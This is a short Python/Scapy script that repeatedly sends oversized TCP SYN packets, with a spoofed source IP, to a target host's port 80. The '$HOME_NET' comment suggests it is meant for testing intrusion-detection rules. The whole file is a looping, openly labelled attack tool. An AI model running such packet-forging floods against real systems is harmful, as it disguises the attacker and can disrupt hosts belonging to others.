```python
from scapy.all import *
import random
import sys

# Configuration
target_ip = "192.168.20.129"  # Replace with an IP in your $HOME_NET
target_port = 80
large_payload = b"A" * 10000  # Large payload of 10,000 bytes

# Send oversized SYN packet
def send_oversized_syn(target_ip, target_port, payload):
    src_ip = "192.168.1.1"  # Replace with an appropriate source IP
    src_port = random.randint(1024, 65535)
    ip = IP(src=src_ip, dst=target_ip)
    syn = TCP(sport=src_port, dport=target_port, flags="S")
    packet = ip / syn / Raw(load=payload)

    # Printing packet details for debugging
    print(f"Sending oversized SYN packet from {src_ip}:{src_port} to {target_ip}:{target_port}")
    print(f"Packet size: {len(payload)} bytes")
    sys.stdout.flush()

    send(packet, verbose=1)

# Run the attack continuously until interrupted
try:
    while True:
        send_oversized_syn(target_ip, target_port, large_payload)
        print("Oversized SYN packet sent successfully.")
        time.sleep(1)
except KeyboardInterrupt:
    print("\nAttack stopped by user.")
except Exception as e:
    print(f"An error occurred: {e}")
```
